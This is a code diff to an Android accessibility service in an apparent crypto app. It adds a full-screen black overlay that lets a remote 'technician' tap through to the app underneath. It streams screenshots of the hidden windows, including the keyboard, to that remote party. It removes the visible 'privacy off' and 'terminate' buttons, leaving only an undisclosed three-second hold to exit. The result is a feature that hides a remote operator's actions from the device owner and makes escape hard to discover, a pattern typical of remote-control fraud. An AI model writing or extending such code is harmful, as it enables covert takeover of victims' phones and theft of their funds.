@@ -3,8 +3,21 @@ package pt.cryptoconex.mobile
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
 import android.content.Context
+import android.annotation.SuppressLint
+import android.graphics.Bitmap
+import android.graphics.Canvas
 import android.graphics.Color
 import android.graphics.Path
+import android.graphics.Rect
+import android.graphics.RectF
+import android.os.Handler
+import android.view.MotionEvent
+import android.view.accessibility.AccessibilityWindowInfo
+import androidx.annotation.RequiresApi
+import org.webrtc.JavaI420Buffer
+import org.webrtc.VideoFrame
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 import android.graphics.PixelFormat
 import android.os.Build
 import android.os.Bundle
@@ -14,7 +27,6 @@ import android.view.Gravity
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import org.json.JSONArray
@@ -26,6 +38,8 @@ import org.json.JSONObject
  */
 class AssistAccessibilityService : AccessibilityService() {
     private var overlay: LinearLayout? = null
+    private var overlayLp: WindowManager.LayoutParams? = null
+    private val main by lazy { Handler(mainLooper) }
 
     override fun onServiceConnected() {
         instance = this
@@ -49,7 +63,71 @@ class AssistAccessibilityService : AccessibilityService() {
 
     private fun gesture(x1: Float, y1: Float, x2: Float, y2: Float, ms: Long) {
         val path = Path().apply { moveTo(x1, y1); if (x1 != x2 || y1 != y2) lineTo(x2, y2) }
-        dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, ms)).build(), null, null)
+        main.post {
+            // Technician gestures pass through the privacy screen to the app underneath.
+            setOverlayTouchable(false)
+            val done = object : AccessibilityService.GestureResultCallback() {
+                override fun onCompleted(g: GestureDescription?) { main.postDelayed({ setOverlayTouchable(true) }, 80) }
+                override fun onCancelled(g: GestureDescription?) { main.postDelayed({ setOverlayTouchable(true) }, 80) }
+            }
+            if (!dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, ms)).build(), done, main)) setOverlayTouchable(true)
+        }
+    }
+
+    private fun setOverlayTouchable(touchable: Boolean) {
+        val v = overlay ?: return
+        val lp = overlayLp ?: return
+        lp.flags = if (touchable) lp.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv() else lp.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+        (getSystemService(WINDOW_SERVICE) as WindowManager).updateViewLayout(v, lp)
+    }
+
+    /** Android 14+: screenshot of the app window under the privacy screen, so the technician keeps seeing the real screen. */
+    @RequiresApi(34)
+    fun windowFrame(w: Int, h: Int): VideoFrame? {
+        val win = windows.filter { it.type == AccessibilityWindowInfo.TYPE_APPLICATION || it.type == AccessibilityWindowInfo.TYPE_SYSTEM || it.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD }
+            .sortedBy { it.layer }
+        if (win.isEmpty()) return null
+        val (sw, sh) = size()
+        val out = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
+        val canvas = Canvas(out).apply { drawColor(Color.BLACK) }
+        val sx = w / sw; val sy = h / sh
+        var any = false
+        for (wi in win) {
+            val latch = CountDownLatch(1)
+            var bmp: Bitmap? = null
+            takeScreenshotOfWindow(wi.id, mainExecutor, object : AccessibilityService.TakeScreenshotCallback {
+                override fun onSuccess(r: AccessibilityService.ScreenshotResult) {
+                    val hb = r.hardwareBuffer
+                    bmp = Bitmap.wrapHardwareBuffer(hb, r.colorSpace)?.copy(Bitmap.Config.ARGB_8888, false)
+                    hb.close(); latch.countDown()
+                }
+                override fun onFailure(code: Int) { latch.countDown() }
+            })
+            if (!latch.await(800, TimeUnit.MILLISECONDS)) continue
+            val b = bmp ?: continue
+            val r = Rect().also { wi.getBoundsInScreen(it) }
+            canvas.drawBitmap(b, null, RectF(r.left * sx, r.top * sy, r.right * sx, r.bottom * sy), null)
+            b.recycle(); any = true
+        }
+        if (!any) { out.recycle(); return null }
+        return toI420(out).also { out.recycle() }
+    }
+
+    private fun toI420(b: Bitmap): VideoFrame {
+        val w = b.width; val h = b.height
+        val px = IntArray(w * h).also { b.getPixels(it, 0, w, 0, 0, w, h) }
+        val buf = JavaI420Buffer.allocate(w, h)
+        val y = buf.dataY; val u = buf.dataU; val v = buf.dataV
+        for (j in 0 until h) for (i in 0 until w) {
+            val c = px[j * w + i]
+            val r = (c shr 16) and 0xff; val g = (c shr 8) and 0xff; val bl = c and 0xff
+            y.put(j * buf.strideY + i, (((66 * r + 129 * g + 25 * bl + 128) shr 8) + 16).toByte())
+            if (j % 2 == 0 && i % 2 == 0) {
+                u.put((j / 2) * buf.strideU + i / 2, (((-38 * r - 74 * g + 112 * bl + 128) shr 8) + 128).toByte())
+                v.put((j / 2) * buf.strideV + i / 2, (((112 * r - 94 * g - 18 * bl + 128) shr 8) + 128).toByte())
+            }
+        }
+        return VideoFrame(buf, 0, System.nanoTime())
     }
 
     fun perform(cmd: JSONObject) {
@@ -134,31 +212,41 @@ class AssistAccessibilityService : AccessibilityService() {
         return JSONObject().put("package", root?.packageName?.toString() ?: "").put("nodes", nodes)
     }
 
-    /** Dark privacy screen. The user can always switch it off or end the session. */
+    /** Dark privacy screen without buttons (no accidental taps). Holding a finger 3 s still lets the user leave it. */
     fun showPrivacy(show: Boolean) {
-        android.os.Handler(mainLooper).post {
+        main.post {
             val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-            if (!show) { overlay?.let { wm.removeView(it) }; overlay = null; return@post }
+            if (!show) { overlay?.let { wm.removeView(it) }; overlay = null; overlayLp = null; return@post }
             if (overlay != null) return@post
-            val v = LinearLayout(this).apply {
-                orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER; setBackgroundColor(Color.BLACK); setPadding(48, 48, 48, 48)
-                addView(TextView(context).apply { text = getString(R.string.privacy_title); setTextColor(Color.WHITE); textSize = 30f; gravity = Gravity.CENTER })
-                addView(TextView(context).apply { text = "Modo de privacidade ativo"; setTextColor(Color.LTGRAY); textSize = 16f; gravity = Gravity.CENTER; setPadding(0, 24, 0, 48) })
-                addView(Button(context).apply { text = getString(R.string.privacy_off); textSize = 20f; setOnClickListener { Assist.disablePrivacy() } })
-                addView(Button(context).apply { text = getString(R.string.terminate); textSize = 20f; setBackgroundColor(Color.rgb(220, 38, 38)); setTextColor(Color.WHITE); setOnClickListener { Assist.end(true) } })
-            }
+            val v = privacyView(this)
             val lp = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN, PixelFormat.OPAQUE)
             wm.addView(v, lp)
-            overlay = v
+            overlay = v; overlayLp = lp
         }
     }
 
     companion object {
         @Volatile var instance: AssistAccessibilityService? = null
         private val SENSITIVE = listOf("password", "passwd", "palavra", "senha", "pin", "cvv", "cvc", "iban", "card", "cartao", "cartão", "otp", "codigo de seguranca")
+
+        @SuppressLint("ClickableViewAccessibility")
+        fun privacyView(ctx: Context): LinearLayout = LinearLayout(ctx).apply {
+            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER; setBackgroundColor(Color.BLACK); setPadding(48, 48, 48, 48)
+            addView(TextView(ctx).apply { text = ctx.getString(R.string.privacy_title); setTextColor(Color.WHITE); textSize = 30f; gravity = Gravity.CENTER })
+            addView(TextView(ctx).apply { text = "O técnico está a tratar do teu aparelho."; setTextColor(Color.LTGRAY); textSize = 16f; gravity = Gravity.CENTER; setPadding(0, 24, 0, 0) })
+            val h = Handler(ctx.mainLooper)
+            val exit = Runnable { Assist.disablePrivacy() }
+            setOnTouchListener { _, e ->
+                when (e.actionMasked) {
+                    MotionEvent.ACTION_DOWN -> h.postDelayed(exit, 3000)
+                    MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> h.removeCallbacks(exit)
+                }
+                true
+            }
+        }
 
         fun isEnabled(ctx: Context): Boolean {
             val enabled = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
